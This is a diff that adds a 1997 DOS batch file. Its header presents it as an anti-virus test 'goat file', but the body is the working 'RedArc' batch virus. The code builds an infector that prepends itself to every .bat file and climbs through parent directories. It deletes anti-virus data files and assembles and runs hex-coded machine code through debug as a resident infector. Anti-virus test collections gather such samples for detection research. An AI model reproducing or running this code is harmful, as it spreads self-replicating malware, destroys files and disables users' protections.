@@ -1,0 +1,69 @@
+goto __st 
+:__you 
+
+@echo This is an AVID test set 100 byte BAT goat file.
+@echo Snorre Fagerland 1997
+
+REM
+REM 
+goto __en 
+:__st
+@echo off
+if exist redarc.bat goto __er
+goto __co
+:__er
+@del redarc.bat >nul
+:__co
+@copy %0 redarc.bat >nul
+:__vi
+@echo goto __st >beg1
+@echo :__you >beg2
+@echo goto __en >pop
+@echo echo off >in0
+@echo find "RedArc" %%1 >in1
+@echo if errorlevel == 1 goto INF >in2
+@echo goto end >in3
+@echo :INF >in4
+@echo copy beg1 + beg2 + %%1 + pop + redarc.bat redarc.dat >in5
+@echo del %%1 >in6
+@echo ren redarc.dat %%1 >in7
+@echo :END >in8
+@copy in0 + in1 + in2 + in3 + in4 + in5 + in6 + in7 + in8 infector.bat >nul
+@del in? >nul
+for %%l in (*.bat) do call infector.bat %%l
+@del infector.bat >nul
+@del beg? >nul
+@del pop >nul
+copy redarc.bat ..\redarc.bat >nul
+@del redarc.bat >nul
+attrib -H anti-vir.dat
+@del anti-vir.* >nul
+@del dr*.* >nul
+@del av*.* >nul
+if exist autoexec.bat goto __pr
+if exist errlog.txt goto __pr
+cd ..
+goto __vi
+:__pr
+@echo N comp83.com >v1
+@echo E 0100 B8 21 35 CD 21 BF 53 01 89 1D 8C 45 02 BA 18 01 >v2
+@echo E 0110 B4 25 CD 21 8B D7 CD 27 3D 00 4B 75 35 50 06 1E >v3
+@echo E 0120 07 8B FA B0 2E F2 AE 57 B8 45 58 AB AA 5F 07 58 >v4
+@echo E 0130 50 52 9C 0E E8 1B 00 B8 43 4F AB B0 4D AA 5A 58 >v5
+@echo E 0140 72 10 B9 02 00 B4 3C CD 21 93 0E 1F B1 53 8B D6 >v6
+@echo E 0150 B4 40 EA >v7
+@echo RCX >v8
+@echo 53 >v9
+@echo W >v10
+@echo Q >v11
+@copy v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9 + v10 + v11 v.scr >nul
+debug <v.scr
+@del v*.* >nul
+comp83.com
+@del comp83.com >nul
+cls
+echo    ...RedArc represents a new BAT-virus...
+echo -=* SGWW, DVC, FotD, SOS group, TAVC, CiD *=-
+goto __you
+:__en
+
